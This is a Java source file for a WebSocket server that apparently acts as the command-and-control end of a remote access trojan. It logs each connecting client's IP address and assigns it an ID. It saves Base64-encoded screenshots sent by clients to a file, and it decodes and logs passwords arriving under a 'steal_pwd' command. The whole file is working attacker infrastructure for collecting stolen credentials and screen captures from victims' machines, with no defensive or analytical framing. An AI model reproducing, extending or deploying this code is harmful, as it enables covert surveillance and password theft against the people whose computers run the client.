package me.soda.server;

import org.java_websocket.WebSocket;
import org.java_websocket.handshake.ClientHandshake;
import org.java_websocket.server.WebSocketServer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetSocketAddress;
import java.util.Arrays;
import java.util.Base64;

public class Server extends WebSocketServer {

    public static final Logger LOGGER = LoggerFactory.getLogger("Server");
    private static final File FILE = new File("screenshot.png");
    private static int clientIndex = 0;

    public Server(int port) {
        super(new InetSocketAddress(port));
    }

    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    @Override
    public void onOpen(WebSocket conn, ClientHandshake handshake) {
        conn.setAttachment(clientIndex);
        int cIndex = conn.<Integer>getAttachment();
        String addr = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        LOGGER.info("客户端连接: " + addr + " ID: " + cIndex);
    }

    @Override
    public void onClose(WebSocket conn, int code, String reason, boolean remote) {
        int cIndex = conn.<Integer>getAttachment();
        LOGGER.info("客户端已断开: ID: " + cIndex);
    }

    @Override
    public void onMessage(WebSocket conn, String message) {
        int cIndex = conn.<Integer>getAttachment();
        String[] msgArr = message.split(" ");
        LOGGER.info("收到消息: " + msgArr[0] + " " + cIndex);
        switch (msgArr[0]) {
            case "screenshot":
                try {
                    FILE.createNewFile();
                    FileOutputStream file = new FileOutputStream(FILE);
                    file.write(Base64.getDecoder().decode(msgArr[1]));
                    file.close();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            case "steal_pwd":
                if (msgArr.length < 3) break;
                String[] strArr = new String[msgArr.length - 2];
                for (int index = 0; index < strArr.length; index++) {
                    strArr[index] = decodeBase64(msgArr[index + 2]);
                }
                LOGGER.info("消息: " + msgArr[0] + " " + Arrays.toString(strArr));
            default:
                try {
                    LOGGER.info("消息: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
                } catch (Exception e) {
                    e.printStackTrace();
                }
        }
    }

    @Override
    public void onError(WebSocket conn, Exception e) {
        e.printStackTrace();
    }

    @Override
    public void onStart() {
    }
}
